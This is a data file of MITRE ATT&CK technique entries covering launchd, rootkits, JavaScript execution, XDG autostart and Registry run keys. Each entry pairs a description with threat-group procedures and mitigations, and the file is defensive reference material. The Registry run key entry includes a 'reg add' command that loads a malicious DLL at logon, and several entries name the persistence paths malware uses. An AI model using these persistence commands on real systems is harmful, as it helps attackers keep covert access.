{"text": " This technique is deprecated due to the inaccurate usage. The report cited did not provide technical detail as to how the malware interacted directly with launchd rather than going through known services. Other system services are used to interact with launchd rather than launchd being used by itself. Adversaries may abuse the <code>Launchd</code> daemon to perform task scheduling for initial or recurring execution of malicious code. The <code>launchd</code> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence). An adversary may use the <code>launchd</code> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <code>launchd</code> can also be abused to run a process under the context of a specified account. Daemons, such as <code>launchd</code>, run with the permissions of the root user account, and will operate regardless of which user account is logged in.", "idx": "https://attack.mitre.org/techniques/T1053/004", "title": "Launchd", "entity": "Launchd", "entity_type": "techniques", "entity_context": ["Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create new Launch Daemons.", "Audit logging for <code>launchd</code> events in MacOS can be reviewed or centrally collected using multiple options, such as syslog, OpenBSM, or OSquery."], "is_subtechnique": true}
{"text": " Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak) Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).", "idx": "https://attack.mitre.org/techniques/T1594", "title": "Search Victim-Owned Websites", "entity": "Search Victim-Owned Websites", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "Silent Librarian has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages.", "Sandworm Team has conducted research against potential victim websites as part of its operational planning."], "is_subtechnique": false}
{"text": " An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard) Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.", "idx": "https://attack.mitre.org/techniques/T1538", "title": "Cloud Service Dashboard", "entity": "Cloud Service Dashboard", "entity_type": "techniques", "entity_context": ["Enforce the principle of least-privilege by limiting dashboard visibility to only the resources required. This may limit the discovery value of the dashboard in the event of a compromised account."], "is_subtechnique": false}
{"text": " Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS) JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts) JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode) Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for", "idx": "https://attack.mitre.org/techniques/T1059/007", "title": "JavaScript", "entity": "JavaScript", "entity_type": "techniques", "entity_context": ["Turn off or restrict access to unneeded scripting components.", "NanHaiShu executes additional Jscript code on the victim's machine.", "MuddyWater has used JavaScript files to execute its POWERSTATS payload.", "Chaes has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.", "Avaddon has been executed through a malicious JScript downloader.", "Metamorfo includes payloads written in JavaScript. ", "Bundlore can execute JavaScript by injecting it into the victim's browser.", "Valak can execute JavaScript containing configuration data for establishing persistence.", "Kimsuky has used JScript for logging and downloading additional tools.", "GRIFFON is written in and executed as JavaScript.\t", "EnvyScout can write files to disk with JavaScript using a modified version of the open-source tool FileSaver.", "The Cobalt Strike System Profiler can use JavaScript to perform reconnaissance actions.", "Cobalt Group has executed JavaScript scriptlets on the victim's machine.", "Silence has used JS scripts.", "JSS Loader can download and execute JavaScript files.", "Molerats used various implants, including those built with JS, on target machines.\t", "jRAT has been distributed as HTA files with JScript.\t", "Sidewinder has used JavaScript to drop and execute malware loaders.", "FIN7 used JavaScript scripts to help perform tasks on the victim's machine.", "Indrik Spider has used malicious JavaScript files for several components of their attack.", "Script blocking extensions can help prevent the execution of JavaScript and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place.", "Leafminer infected victims using JavaScript code.", "Higaisa used JavaScript to execute additional files.", "Astaroth uses JavaScript to perform its core functionalities. ", "FIN6 has used malicious JavaScript to steal payment card data from e-commerce sites.", "Evilnum has used malicious JavaScript files on the victim's machine.", "AppleSeed has the ability to use JavaScript to execute PowerShell.", "Denylist scripting where appropriate.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent JavaScript scripts from executing potentially malicious downloaded content .", "APT32 has used JavaScript for drive-by downloads and C2 communications.", "Xbash can execute malicious JavaScript payloads on the victim’s machine.", "InvisiMole can use a JavaScript file as part of its execution chain.", "SpicyOmelette has the ability to execute arbitrary JavaScript code on a compromised host.", "TA505 has used JavaScript for code execution.", "POWERSTATS can use JavaScript code for execution.", "The QakBot web inject module can inject Java Script into web banking pages visited by the victim.", "Turla has used various JavaScript-based backdoors.\t"], "is_subtechnique": true}
{"text": " Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014) Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)", "idx": "https://attack.mitre.org/techniques/T1564/005", "title": "Hidden File System", "entity": "Hidden File System", "entity_type": "techniques", "entity_context": ["Strider has used a hidden file system that is stored as a file on disk.", "Regin has used a hidden file system to store some of its components.", "BOOTRASH has used unallocated disk space between partitions for a hidden file system that stores components of the Nemesis bootkit.", "ComRAT has used a portable FAT16 partition image placed in %TEMP% as a hidden file system.", "Equation has used an encrypted virtual file system stored in the Windows Registry."], "is_subtechnique": true}
{"text": " Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user. Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Link shortening services can also be employed.", "idx": "https://attack.mitre.org/techniques/T1608/005", "title": "Link Target", "entity": "Link Target", "entity_type": "techniques", "entity_context": ["Silent Librarian has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. Silent Librarian has also made use of a variety of URL shorteners for these staged websites.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)", "idx": "https://attack.mitre.org/techniques/T1014", "title": "Rootkit", "entity": "Rootkit", "entity_type": "techniques", "entity_context": ["LoJax is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.", "APT41 deployed rootkits on Linux systems.", "Hikit is a Rootkit that has been used by Axiom.  ", "Hildegard has modified /etc/ld.so.preload to overwrite readdir() and readdir64().", "Winnti Group used a rootkit to modify typical server functionality.", "Skidmap is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.", "Winnti for Linux has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.", "APT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax.", "Umbreon hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.", "HiddenWasp uses a rootkit to hook and implement functions on the system.", "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.", "Caterpillar WebShell has a module to use a rootkit on a system. ", "PoisonIvy starts a rootkit from a malicious file dropped to disk.", "Stuxnet uses a Windows rootkit to mask its binaries and other relevant files.", "Drovorub has used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view.", "Ramsay has included a rootkit to evade defenses.\t", "HTRAN can install a rootkit to hide network connections from the host OS.", "Zeroaccess is a kernel-mode rootkit.", "Carberp has used user mode rootkit techniques to remain hidden on the system.", "HIDEDRV is a rootkit that hides certain operating system artifacts.", "TeamTNT has used the open-source rootkit Diamorphine to hide cryptocurrency mining activities on the machine. ", "Hacking Team UEFI Rootkit is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.", "Ebury has used user mode rootkit techniques to remain hidden on the system.", "Uroburos is a rootkit used by Turla."], "is_subtechnique": false}
{"text": " Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.", "idx": "https://attack.mitre.org/techniques/T1598/001", "title": "Spearphishing Service", "entity": "Spearphishing Service", "entity_type": "techniques", "entity_context": ["Users can be trained to identify social engineering techniques and spearphishing attempts."], "is_subtechnique": true}
{"text": " Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.", "idx": "https://attack.mitre.org/techniques/T1565/003", "title": "Runtime Data Manipulation", "entity": "Runtime Data Manipulation", "entity_type": "techniques", "entity_context": ["Prevent critical business and system processes from being replaced, overwritten, or reconfigured to load potentially malicious code.", "APT38 has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.", "Identify critical business and system processes that may be targeted by adversaries and work to isolate and secure those systems against unauthorized access and tampering."], "is_subtechnique": true}
{"text": " Adversaries may modify XDG autostart entries to execute programs or commands during system boot. Linux desktop environments that are XDG compliant implement functionality for XDG autostart entries. These entries will allow an application to automatically start during the startup of a desktop environment after user logon. By default, XDG autostart entries are stored within the <code>/etc/xdg/autostart</code> or <code>~/.config/autostart</code> directories and have a .desktop file extension.(Citation: Free Desktop Application Autostart Feb 2006) Within an XDG autostart entry file, the <code>Type</code> key specifies if the entry is an application (type 1), link (type 2) or directory (type 3). The <code>Name</code> key indicates an arbitrary name assigned by the creator and the <code>Exec</code> key indicates the application and command line arguments to execute.(Citation: Free Desktop Entry Keys) Adversaries may use XDG autostart entries to maintain persistence by executing malicious commands and payloads, such as remote access tools, during the startup of a desktop environment. Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make XDG autostart entries look as if they are associated with legitimate programs.", "idx": "https://attack.mitre.org/techniques/T1547/013", "title": "XDG Autostart Entries", "entity": "XDG Autostart Entries", "entity_type": "techniques", "entity_context": ["NETWIRE can use XDG Autostart Entries to establish persistence.", "Restrict write access to XDG autostart entries to only select privileged users.", "Limit privileges of user accounts so only authorized privileged users can create and modify XDG autostart entries.", "Restrict software installation to trusted repositories only and be cautious of orphaned software packages.", "Fysbis has installed itself as an autostart entry under <code>~/.config/autostart/dbus-inotifier.desktop</code> to establish persistence."], "is_subtechnique": true}
{"text": " Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level. Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>. The following run keys are created by default on Windows systems: * <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> * <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code> * <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> * <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code> Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018) The following Registry keys can be used to set startup folder items for persistence: * <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code> * <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell", "idx": "https://attack.mitre.org/techniques/T1547/001", "title": "Registry Run Keys / Startup Folder", "entity": "Registry Run Keys / Startup Folder", "entity_type": "techniques", "entity_context": ["VBShower used <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\\a-f0-9A-F{8}</code> to maintain persistence.", "NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism.", "GRIFFON has used a persistence module that stores the implant inside the Registry, which executes at logon.", "Gold Dragon establishes persistence in the Startup folder.", "Metamorfo has configured persistence to the Registry ket <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, Spotify =% APPDATA%\\Spotify\\Spotify.exe</code> and used .LNK files in the startup folder to achieve persistence.", "BRONZE BUTLER has used a batch script that adds a Registry Run key to establish malware persistence.", "Machete used the startup folder for persistence.", "Pteranodon copies itself to the Startup folder to establish persistence.", "MCMD can use Registry Run Keys for persistence.", "PLAINTEE gains persistence by adding the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>.", "Sykipot has been known to establish persistence by adding programs to the Run Registry key.", "FatDuke has used <code>HKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Run</code> to establish persistence.", "Some InnaputRAT variants establish persistence by modifying the Registry key <code>HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe</code>.", "Mosquito establishes persistence under the Registry key <code>HKCU\\Software\\Run auto_update</code>.", "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.", "Cobalt Group has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.", "PoisonIvy creates run key Registry entries pointing to a malicious executable dropped to disk.", "PowerSploit's <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.", "Cobian RAT creates an autostart Registry key to ensure persistence.", "Conficker adds Registry Run keys to establish persistence.", "Gazer can establish persistence by creating a .lnk file in the Start menu.", "Ramsay has created Registry Run keys to establish persistence.", "Windshift has created LNK files in the Startup folder to establish persistence.", "A Threat Group-3390 tool can add the binary’s path to the Registry key <code>Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> to add persistence.", "BitPaymer has set the run key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.", "GrimAgent can set persistence with a Registry run key.", "EvilGrab adds a Registry Run key for ctfmon.exe to establish persistence.", "Okrum establishes persistence by creating a .lnk shortcut to itself in the Startup folder. ", "A dropper used by Putter Panda installs itself into the ASEP Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> with a value named McUpdate.", "Helminth establishes persistence by creating a shortcut in the Start Menu folder.", "gh0st RAT has added a Registry Run key to establish persistence.", "InvisiMole can place a lnk file in the Startup Folder to achieve persistence.", "APT37's has added persistence via the Registry key <code>HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\</code>.", "MoleNet can achieve persitence on the infected machine by setting the Registry run key. ", "Carberp has maintained persistence by placing itself inside the current user's startup folder.", "PowerDuke achieves persistence by using various Registry Run keys.", "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.", "LiteDuke can create persistence by adding a shortcut in the <code>CurrentVersion\\Run</code> Registry key.", "Briba creates run key Registry entries pointing to malicious DLLs dropped to disk.", "build_downer has the ability to add itself to the Registry Run key for persistence.", "If establishing persistence by installation as a new service fails, one variant of Elise establishes persistence for the created .exe file by setting the following Registry key: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe</code>. Other variants have set the following Registry keys for persistence: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : self</code> and <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD</code>.", "ADVSTORESHELL achieves persistence by adding itself to the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.", "RTM has used Registry run keys to establish persistence for the RTM Trojan and other tools, such as a modified version of TeamViewer remote desktop software.", "SMOKEDHAM has used <code>reg.exe</code> to create a Registry Run key.", "Truvasys adds a Registry Run key to establish persistence.", "Carbanak stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.", "Hi-Zor creates a Registry Run key to establish persistence.", "Maze has created a file named \"startup_vrun.bat\" in the Startup folder of a virtual machine to establish persistence.", "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.", "Most Sakula samples maintain persistence by setting the Registry Run key <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> in the HKLM or HKCU hive, with the Registry value and file name varying by sample.", "Kazuar adds a sub-key under several Registry run keys.", "LookBack sets up a Registry Run key to establish a persistence mechanism.", "Chaes has added persistence via the Registry key <code>software\\microsoft\\windows\\currentversion\\run\\microsoft windows html help</code>.", "Bazar can create or add files to Registry Run Keys to establish persistence.", "Octopus achieved persistence by placing a malicious executable in the startup directory. ", "Trojan.Karagany can create a link to itself in the Startup folder to automatically start itself upon system restart.", "Ixeshe can achieve persistence by adding itself to the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.", "NanoCore creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.", "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.\t", "Revenge RAT creates a Registry key at <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> to survive a system reboot.", "Kasidet creates a Registry Run key to establish persistence.", "S-Type may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}</code>.", "Bisonal adds itself to the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\</code> for persistence.", "Agent Tesla can add itself to the Registry as a startup program to establish persistence. ", "Pupy adds itself to the startup folder or adds itself to the Registry key <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code> for persistence.", "Dragonfly 2.0 added the registry value ntdll to the Registry Run key to establish persistence.", "APT39 has maintained persistence using the startup folder.", "DarkComet adds several Registry entries to enable automatic execution at every system startup.", "Zebrocy creates an entry in a Registry Run key for the malware to execute on startup.", "EvilBunny has created Registry keys for persistence in <code>HKLM|HKCU\\…\\CurrentVersion\\Run</code>.\t", "Variants of Emissary have added Run Registry keys to establish persistence.", "Lucifer can persist by setting Registry key values <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic</code> and <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic</code>.", "ZIRCONIUM has created a Registry Run key named <code>Dropbox Update Setup</code> to establish persistence for a malicious Python binary.", "ServHelper may attempt to establish persistence via the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> run key.", "PowerShower sets up persistence with a Registry run key.", "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder.", "Hancitor  has added Registry Run keys to establish persistence.", "Matryoshka can establish persistence by adding Registry Run keys.", "Empire can modify the registry run keys <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.", "Ursnif has used Registry Run keys to establish automatic execution at system startup.", "IcedID has established persistence by creating a Registry run key.", "TINYTYPHON installs itself under Registry Run key to establish persistence.", "CORESHELL has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.", "DustySky achieves persistence by creating a Registry entry in <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.", "SNUGRIDE establishes persistence through a Registry Run key.", "StrongPity can use the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key for persistence.", "Sharpshooter's first-stage downloader installed Rising Sun to the startup folder <code>%Startup%\\mssync.exe</code>.\t", "Ryuk has used the Windows command line to create a Registry entry under <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence.", "Taidoor has modified the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> key for persistence.", "FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.", "GuLoader can establish persistence via the Registry under <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>.", "APT32 established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.", "An APT19 HTTP malware variant establishes persistence by setting the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\</code>.", "Zeus Panda adds persistence by creating Registry Run keys.", "APT33 has deployed a tool known as DarkComet to the Startup folder of a victim, and used Registry run keys to gain persistence.", "Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.", "FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key.", "Molerats saved malicious files within the AppData and Startup folders to maintain persistence.", "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.", "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence.", "Inception has maintained persistence by modifying Registry run key value \n <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code>.", "JHUHUGIT has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.", "Grandoreiro can use run keys and create link files in the startup folder for persistence.", "NavRAT creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.", "Pisloader establishes persistence via a Registry Run key.", "Tropic Trooper has created shortcuts in the Startup folder to establish persistence.", "Smoke Loader adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.", "Astaroth creates a startup item for persistence. ", "Vasport copies itself to disk and creates an associated run key Registry entry to establish.", "Prikormka adds itself to a Registry Run key with the name guidVGA or guidVSA.", "Honeybee uses a batch file that configures the ComSysApp service to autostart in order to establish persistence.", "MuddyWater has added Registry Run key <code>KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding</code> to establish persistence.", "Rifdoor has created a new registry entry at <code>HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics</code> with a value of <code>C:\\ProgramData\\Initech\\Initech.exe /run</code>.", "HTTPBrowser has established persistence by setting the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> key value for <code>wdm</code> to the path of the executable. It has also used the Registry entry <code>HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn “%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe”</code> to establish persistence.", "A Turla Javascript backdoor added a local_update_check value under the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.", "Crimson can add Registry run keys for persistence.", "FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.", "BoomBox can establish persistence by writing the Registry value <code>MicroNativeCacheSvc</code> to <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>.", 